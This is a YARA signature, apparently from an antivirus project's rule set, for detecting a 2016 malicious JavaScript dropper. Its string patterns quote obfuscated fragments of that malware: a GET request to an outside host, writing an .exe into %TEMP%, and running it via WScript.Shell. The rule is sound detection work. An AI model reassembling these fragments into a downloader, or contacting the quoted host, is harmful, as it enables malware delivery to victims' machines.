rule sig_20160329_d05dc84c58072d23c08634a18fb19546 {
  meta:
    description = "datamaliciousorder - file 20160329_d05dc84c58072d23c08634a18fb19546.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4abee705132101ac27a9866e2b5d7cbb95c7245706ff41d5ddc8c8464a6bd3c6"

  strings:
    $s1  = "ZF[KN](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function F() {return s[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"aLW0uD0fl.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[q](o() * 11); if (ZF[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var s = function I() {return WScript[yf](\"WScript.Shell\");}(), V = 11;" fullword ascii
    $s5  = "function H(ey, qX){Jx = Jx * 1; return ey - qX;};" fullword ascii
    $s6  = "function O(){return \"\" + C;};" fullword ascii
    $s7  = "function vS(dU){s[\"Run\"](dU, Jx, Jx);};" fullword ascii
    $s8  = "function c() {return ((l == true) && (l == u)) ? 1 : Jx;};" fullword ascii
    $s9  = "function o(){return 22;};" fullword ascii
    $s10 = "var Dg = new this[\"Date\"]();" fullword ascii
    $s11 = "function Pt(){return yf;};" fullword ascii
    $s12 = "function iy()" fullword ascii
    $s13 = "return H(h, YG);" fullword ascii
    $s14 = " while (UX){" fullword ascii
    $s15 = "function Yl(T) {var dk = (1, 2, 3, 4, 5, T); return dk;};" fullword ascii
    $s16 = "var l0 = false;" fullword ascii
    $s17 = "var l = false;" fullword ascii
    $s18 = "l = true; " fullword ascii
    $s19 = "var u = false;" fullword ascii
    $s20 = "u = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}